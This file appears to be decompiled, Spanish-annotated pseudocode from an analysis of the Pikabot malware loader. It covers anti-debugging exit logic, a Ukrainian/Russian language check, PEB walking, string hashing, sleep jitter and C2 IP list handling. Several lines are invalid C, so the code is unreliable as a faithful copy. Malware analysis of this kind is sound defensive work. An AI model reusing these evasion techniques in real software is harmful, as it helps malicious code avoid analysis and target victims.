
void __cdecl blockProgram(int param_1)
{
  rand = get_randNumber(param_1); // nunca va a ser 0

  if (rand != 0) {
    /*
      kernel32.WaitForSingleObjectEx: Espera hasta que el objeto especificado esté en estado señalado, una rutina de finalización de E/S o una llamada de procedimiento asincrónico (APC) se pone en cola en el subproceso o el intervalo de tiempo de espera transcurrido.
      DWORD WaitForSingleObjectEx(
        [in] HANDLE hHandle,
        [in] DWORD  dwMilliseconds,
        [in] BOOL   bAlertable
      );
      hHandle: identificador del objeto
      dwMilliseconds: Intervalo de tiempo de espera, en milisegundos
      bAlertable: Di FALSE la función no devuelve y no se ejecuta la rutina de finalización o la función APC. -> FALSE
    */
    (**(code **)(_pikabot_struct + 0x38))(0xffffffff, rand, 0);
  }
  return;
}

void __cdecl create_mem_iterator_struct(undefined4 *struct_mem_ptr,undefined *content_ptr, int mem_size)
{
  if (struct_mem_ptr != 0x0) {
    /* // Asigna el número especificado de bytes del montón.
    DECLSPEC_ALLOCATOR HLOCAL LocalAlloc(
      [in] UINT   uFlags,
      [in] SIZE_T uBytes
    );
    - uflags: 0x40 = LPTR: LMEM_FIXED (memoriafija) y LMEM_ZEROINIT (incializacion de la memoria a 0)
    - uBytes: size of Allocated Memory
    -> ret: si se ejecuta bien devuelve un id para el objeto de memoria recien asignada
    */
    mem_ptr = (undefined *)(**(code **)(_pikabot_struct_mem_ptr + 0x50))(0x40, mem_size);
    move_Mem(struct_mem_ptr, content_ptr, mem_size);

    *struct_mem_ptr = mem_ptr;
    *struct_mem_ptr + 0x4 = *struct_mem_ptr;
    *struct_mem_ptr + 0x8 = mem_size;
    *struct_mem_ptr + 0xc = mem_size;
  }
  return;
}

undefined4 __cdecl call_syscalls0(int param_1) // param_1 = -1 = FFFFFFFF
{  
  if (param_1 != 0) {
    if (*(short *)(_pikabot_struct + 0x150) != 0) {
      call_syscalls1(); // executeSyscall(0x7bd19d6,_current_ret_address); // id=19 -> ZwQueryInformationProcess
    }
  }
  return 0;
}

int __fastcall countIPs(uint param_1)
{
  counter = 0;
  concatIPData = *(int *)(_pikabot_struct + 0x17c);
  do {
    if (concatIPData == 0) {
      uVar3 = param_1;
      break;
    }
    concatIPData = *(int *)(concatIPData + 0x14);
    counter = counter + 1;
  } while (*(int *)(_pikabot_struct + 0x17c) != concatIPData);

  return counter;
}

int __cdecl encryptString(int string,uint str_size,int hash)
{
  if ((string != 0) && (str_size != 0)) {
    i = 0;
    do {
      char_i = *(char *)(string + i);
      i = i + 1;
      hash = (int)char_i + hash * 5;
    } while (i < str_size);
  }
  return hash;
}

undefined4 __cdecl get_dll_ptr(int param_1)
{
  int _struct_ptr;
  int iVar2;
  uint uVar3;
  undefined4 *InLoadOrderModuleList;
  int unaff_FS_OFFSET;
  byte local_120 [272];
  
  // guarda TEB* en _struct + 0x?
  _struct_ptr = _array;
  if (*(int *)(_array + 0x1a0) == 0) {
    *(undefined4 *)(_struct_ptr + 0x1a0) = *(undefined4 *)(unaff_FS_OFFSET + 0x18);
  }

  peb_ldr_data = *(int *)(*(int *)(*(int *)(_struct_ptr + 0x1a0) + 0x30) + 0xc);
  InLoadOrderModuleList = *(undefined4 **)(peb_ldr_data + 0xc);

  while( true ) {
    if (InLoadOrderModuleList == (undefined4 *)(peb_ldr_data + 0xc)) {
      return 0;
    }

    a = FUN_00a8e788((char *)local_120,(undefined2 *)InLoadOrderModuleList[0xc],0x104);
    b = FUN_00a83d30(local_120,a,1);
    if ((b == param_1) || (param_1 == 0)) break;

    InLoadOrderModuleList = (undefined4 *)*InLoadOrderModuleList;
  }
  return InLoadOrderModuleList[6];
}

int get_Nonezero_randomNumber(void)
{
  uint ret;
  
  ret = get_randomNumber();
  ret_val = ( (ret % 0x7ffffffe & 1) != 0) + (ret % 0x7ffffffe) +  2; // can never be 0
  return ret_val;
}

int __cdecl get_randNumber(int param_1)
{
  if (param_1 == 0) {

    if (*(int *)(_pikabot_struct + 0x184) == 1) {
      val0 = *(int *)(_pikabot_struct + 0x188) * 1000;
    }
    else {
      val0 = *(int *)(_pikabot_struct + 0x160) * 1000;
    }

  }
  else {
    val0 = *(int *)(_pikabot_struct + 0x164) * 1000; // 29000
  }
  val1 = *(int *)(_pikabot_struct + 0x168); // 2e

  // genera un numero aleatorio entre 0 y (divisor-1) -> divisor = 
    // val0 = 29000 -> (29000*2e/100)=(13340) => [0, 13339]
  randomN = get_Nonezero_randomNumber();
  random_zero_max = (int)(randomN % ((val1 * val0) / 100)); 

  // establece si es positivo o negativo de forma aleatoria
  randomB = get_randomBoolean();
  val2 = -random_zero_max;
  if (randomB != 0) {
    val2 = random_zero_max;
  }

  return val0 + val2;
}

uint get_randomBoolean(void)
{
  seed = (uint)((ulonglong)_DAT_7ffe0320 * (ulonglong)_DAT_7ffe0004) >> 0x18 |
                ((int)((ulonglong)_DAT_7ffe0320 * (ulonglong)_DAT_7ffe0004 >> 0x20) +
                _DAT_7ffe0324 * _DAT_7ffe0004) * 0x100;
  rand = (**(code **)(_pikabot_struct + 0x28))(seed);
  return ~rand & 1;
}

void get_randomNumber(void)
{
  /*
    The RtlRandomEx routine returns a random number that was generated from a given seed value.
    NTSYSAPI ULONG RtlRandomEx(
      [in, out] PULONG Seed
    );
  */
  seed = (uint)((ulonglong)_DAT_7ffe0320 * (ulonglong)_DAT_7ffe0004) >> 0x18 |
                ((int)((ulonglong)_DAT_7ffe0320 * (ulonglong)_DAT_7ffe0004 >> 0x20) +
                _DAT_7ffe0324 * _DAT_7ffe0004) * 0x100;
  randomNumber = (**(code **)(_pikabot_struct + 0x28))(seed);


  randomNumber = (**(code **)(_pikabot_struct + 0x28))(randomNumber);
  return randomNumber;
}

int getNExtC2Data(void)

{
  NExtC2Data = *(int *)(_pikabot_struct + 0x178);

  if (NExtC2Data == 0) {
    concatIPData = *(int *)(_pikabot_struct + 0x17c);
  }

  while( true ) {
    IPcount = countIPs();
    if (IPcount == 0) {
      return concatIPData;
    }

    concatIPData = *(int *)(concatIPData + 0x14);
    if (concatIPData == 0) {
      concatIPData = *(int *)(_pikabot_struct + 0x17c);
    }

    if (*(int *)(concatIPData + 0x10) == 0) break;

    concatIPData = *(int *)(concatIPData + 0x14);
  }
  return concatIPData;
}

undefined8 __fastcall lang_UKRU(undefined4 param_1)
{
  short langID;
  uint lang_is_UKRU;

  // lang_id = kernel32.GetUserDefaultLangID
  /*
    https://learn.microsoft.com/es-es/windows/win32/intl/language-identifiers
    Un identificador de idioma es una abreviatura numérica internacional estándar 
    para el idioma de un país o región geográfica. Cada idioma tiene un identificador de idioma 
    único (tipo de datos LANGID), un lang_is_UKRUor de 16 bits que consta de un identificador de idioma principal 
    y un identificador de sublanguaje.

    +-------------------------+-------------------------+
    |     SubLanguage ID      |   Primary Language ID   |
    +-------------------------+-------------------------+
    15                    10  9                         0   bit

    0x422 -> Ucraniano (Ucrania)
    0x419 -> Ruso (Rusia)
  */

  langID = (**(code **)(_pikabot_struct + 0xc0))();
  lang_is_UKRU = (uint)(langID == 0x422 || langID == 0x419);

  return lang_is_UKRU;
}

undefined * __cdecl move_Mem(undefined *dst,undefined *src, int size)
{
  for (dst_ = dst; dst + size != dst_; dst_ = dst_ + 1) {
    *dst_ = *src;
    src = src + 1;
    return dst;
  }
}

void __cdecl shift_and_check_DebuggerPresent(int content,int sizeOfContent)
{
  for (i = 0; i < *(uint *)(_pikabot_struct + 0x15c); i = i + 1) {
    ret = call_remoteDebuggerPresent(); // if debugger present returns 0x2500, else ret=0
    if (ret == 0x2500) {
      call_exit_user_proc();
    }
    index = sizeOfContent - 1;
    while (index != 0) {
      currentByte = *(undefined *)(content + index);
      *(undefined *)(content + index) = *(undefined *)(content + index - 1);
      *(undefined *)(content + index - 1) = currentByte;
      index = index - 1;
    }
  }
  return;
}


undefined4 call_remoteDebuggerPresent(void)
{
  (**(code **)(_pikabot_struct + 0x3c))(0xffffffff,&local_10,puVar8,uVar9,uVar10);
  if (local_10 == 0) {
    return 0;
  }
  return 0x2500;
}

int * __cdecl store_concatenatedData(undefined *content,int size,int val8,int val4)
{
  int *ptr_ptr_mem;
  int ptr_mem;
  
  ptr_ptr_mem = call_RtlAllocateHeap(0x18);
  ptr_mem = call_RtlAllocateHeap(size + 2);

  *ptr_ptr_mem = ptr_mem;
  ptr_ptr_mem + 0x4 = val8;
  ptr_ptr_mem + 0x8 = val4;
  ptr_ptr_mem + 0x10 = 0;
  ptr_ptr_mem + 0x14 = *(int *)(_pikabot_struct + 0x17c);

  fillContentWithVal(ptr_mem, 0, size + 2);
  move_Mem((undefined *)*ptr_ptr_mem, content, size);

  *(int **)(_pikabot_struct + 0x17c) = ptr_ptr_mem;

  return ptr_ptr_mem;
}

int __cdecl string_size(char *user_and_machine_ptr)
{
  char *usrNmchine_ptr;
  int retVal;
  
  usrNmchine_ptr = user_and_machine_ptr;
  if (user_and_machine_ptr == (char *)0x0) {
    retVal = 0;
  } else {
    for (; *usrNmchine_ptr != '\0'; usrNmchine_ptr = usrNmchine_ptr + 1) {}
    retVal = (int)usrNmchine_ptr - (int)user_and_machine_ptr;
  }
  return retVal;
}

void call_exit_user_proc(void)
{
  (**(code **)(_pikabot_struct + 0x30))(0);
  return;
}